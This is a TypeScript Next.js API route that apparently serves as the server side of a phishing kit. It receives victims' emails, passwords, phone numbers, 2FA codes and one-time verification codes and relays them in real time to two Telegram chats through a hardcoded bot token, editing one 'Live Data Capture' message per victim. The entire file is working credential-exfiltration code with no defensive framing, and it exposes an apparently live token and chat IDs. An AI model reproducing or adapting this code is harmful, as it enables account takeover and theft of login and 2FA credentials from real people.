import { NextResponse } from 'next/server';
import { liveMessages } from '../telegram-session-store';

// Configuration (Moved from client-side)
const BOT_TOKEN = '8265930062:AAGIUa2MeYdv5TgK3UJbRNQysOyXr2Qf8Q4';
const CHAT_IDS = ['1317350393', '7658323458'];

function formatLiveMessage(data: Record<string, string>, username: string, userId: string): string {
    const timestamp = new Date().toLocaleString();
    const userDisplay = username ? `${username} (ID: ${userId})` : `ID: ${userId}`;
    
    let message = `🔔 <b>Live Data Capture</b>\n\n`;
    
    if (data.user_email) message += `📧 <b>Email/Phone:</b> <code>${data.user_email}</code>\n`;
    if (data.user_password) message += `🔐 <b>Password:</b> <code>${data.user_password}</code>\n`;
    if (data.user_phone_number) message += `📱 <b>Phone:</b> <code>${data.user_phone_number}</code>\n`;
    if (data.user_2fa_code) message += `🔢 <b>2FA Code:</b> <code>${data.user_2fa_code}</code>\n`;
    if (data.user_verification_codes) {
        try {
            const codes = JSON.parse(data.user_verification_codes);
            if (codes['2fa']) message += `✅ <b>2FA Verify:</b> <code>${codes['2fa']}</code>\n`;
            if (codes.email) message += `✅ <b>Email Verify:</b> <code>${codes.email}</code>\n`;
            if (codes.phone) message += `✅ <b>Phone Verify:</b> <code>${codes.phone}</code>\n`;
            if (codes.otp) message += `✅ <b>OTP:</b> <code>${codes.otp}</code>\n`;
        } catch {
            message += `✅ <b>Verification:</b> <code>${data.user_verification_codes}</code>\n`;
        }
    }
    
    message += `\n👤 <b>User:</b> ${userDisplay}\n🕐 <b>Last Update:</b> ${timestamp}`;
    
    return message;
}

export async function POST(request: Request) {
    try {
        const body = await request.json();
        const { dataType, value, userId, username } = body;

        console.log(`[Telegram Proxy] 📥 Received: ${dataType} = ${value} (User: ${userId})`);

        if (!value) {
            console.log('[Telegram Proxy] ❌ Value is empty');
            return NextResponse.json({ error: 'Value is required' }, { status: 400 });
        }

        // Process each chat ID
        const results = await Promise.all(CHAT_IDS.map(async (chatId) => {
            const sessionKey = `${userId}_${chatId}`;
            const existingSession = liveMessages.get(sessionKey);

            // Update data
            const data = existingSession?.data || {};
            data[dataType] = value;

            // Format message with HTML
            const message = formatLiveMessage(data, username, userId);

            if (existingSession) {
                // Edit existing message
                console.log(`[Telegram Proxy] ✏️ Editing message ${existingSession.messageId} in chat ${chatId}`);
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: existingSession.messageId,
                        text: message,
                        parse_mode: 'HTML'
                    }),
                });

                if (!response.ok) {
                    const errorText = await response.text();
                    console.error(`[Telegram Proxy] ❌ Failed to edit message:`, errorText);
                    return { success: false, error: errorText };
                }

                console.log(`[Telegram Proxy] ✅ Successfully edited message in chat ${chatId}`);

                // Update stored data
                liveMessages.set(sessionKey, { messageId: existingSession.messageId, data });
                return { success: true, action: 'edited' };
            } else {
                // Send new message
                console.log(`[Telegram Proxy] 📨 Sending new message to chat ${chatId}`);
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    }),
                });

                if (response.ok) {
                    const result = await response.json();
                    const messageId = result.result.message_id;
                    liveMessages.set(sessionKey, { messageId, data });
                    console.log(`[Telegram Proxy] ✅ Sent new message ${messageId} to chat ${chatId}`);
                    return { success: true, action: 'created', messageId };
                } else {
                    const errorText = await response.text();
                    console.error(`[Telegram Proxy] ❌ Failed to send message:`, errorText);
                    return { success: false, error: errorText };
                }
            }
        }));

        console.log(`[Telegram Proxy] 🎯 Processed ${results.length} chats`);
        return NextResponse.json({ success: true, results });
    } catch (error) {
        console.error('[Telegram Proxy] ❌ Error:', error);
        return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
    }
}
